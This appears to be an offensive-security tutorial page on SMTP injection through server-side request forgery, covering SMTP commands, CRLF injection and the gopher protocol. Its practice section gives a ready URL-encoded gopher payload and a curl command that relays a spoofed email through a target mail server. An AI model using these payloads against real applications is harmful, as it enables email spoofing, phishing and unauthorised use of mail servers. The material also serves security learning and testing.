---
title: Understanding and Exploiting SMTP Injection
description: Learn how SMTP Injection can be used to exploit vulnerabilities for command
  execution and email spoofing.
keywords:
- SMTP Injection
- SSRF
- Email Spoofing
- Command Execution
- gopher protocol
- SMTP commands
- cybersecurity
---

# SMTP Injection

## Context

SMTP Injection is a technique used in offensive cybersecurity to exploit vulnerabilities in web applications that can relay SMTP commands without proper sanitization. This exploitation often involves using Server-Side Request Forgery (SSRF) to execute commands on mail servers, potentially leading to email spoofing and unauthorized command execution.

## Theory

### SMTP Command Injection Fundamentals

SMTP Injection is a malicious exploitation where attackers manipulate SMTP commands through SSRF-enabled pathways. This can result in unauthorized email sending or other mail server command executions. The core principle is to exploit the lack of input sanitization in web applications that interact with SMTP servers, allowing the attacker to inject commands that the server then executes.

### Key SMTP Commands for Injection

The primary SMTP commands involved in injection attacks are `MAIL FROM`, `RCPT TO`, and `DATA`. These commands are typically injected by crafting payloads that use CRLF sequences to break out of expected data and append additional SMTP instructions. This allows an attacker to chain together multiple commands in a single SSRF request, leading to complex exploits.

### Gopher Protocol as an SSRF Vector for SMTP

The gopher protocol stands out in SSRF attacks due to its ability to transmit arbitrary TCP payloads. By encoding SMTP commands within gopher URLs, attackers can leverage SSRF vulnerabilities to inject these commands into a victim SMTP server, bypassing most traditional security mechanisms that focus on HTTP or other standard web protocols.

### Email Spoofing via SMTP Injection

SMTP Injection not only facilitates command execution but also enables email spoofing. By injecting commands to set `MAIL FROM` and `RCPT TO` headers, attackers can control both the sender and recipient identities in the emails sent by the compromised SMTP server. This type of manipulation can be used for phishing attacks or spreading malware under the guise of a trusted sender.

## Practice

### SMTP Injection via SSRF using gopher://

To successfully execute SMTP Injection via SSRF, follow these instructions:

- **Identify an SSRF Endpoint:**
  Locate a web application feature that allows fetching of remote URLs. Common features include tools for generating PDFs from web content or webhook testing interfaces that accept arbitrary URLs.

- **Craft the Payload:**

  ```http
  gopher://smtp.target.com:25/_MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Pwned%0d%0a%0d%0aThis%20is%20a%20test%20email%20via%20SMTP%20injection.%0d%0a.%0d%0a
  ```

  This payload sends a spoofed email from the attacker’s fake address to the victim, demonstrating email control through injection.

- **Trigger the SSRF:**

  ```bash
  curl -X POST -d 'url=gopher://smtp.target.com:25/_MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@target.com>%0d%0aDATA%0d%0aSubject:%20Pwned%0d%0a%0d%0aThis%20is%20a%20test%20email%20via%20SMTP%20injection.%0d%0a.%0d%0a' https://vulnerable-app.local/fetch-url
  ```

  By posting this data to the vulnerable application's URL-fetching endpoint, you can execute SMTP commands on the target’s mail server. This generates an email from the attack vector without being detected by typical security controls.

The outcome of this approach allows you to execute arbitrary SMTP commands on the target mail server, opening the door to email spoofing and potentially further exploits if additional services are running on the same mail server.

## Tools

- **curl**
- **Burp Suite**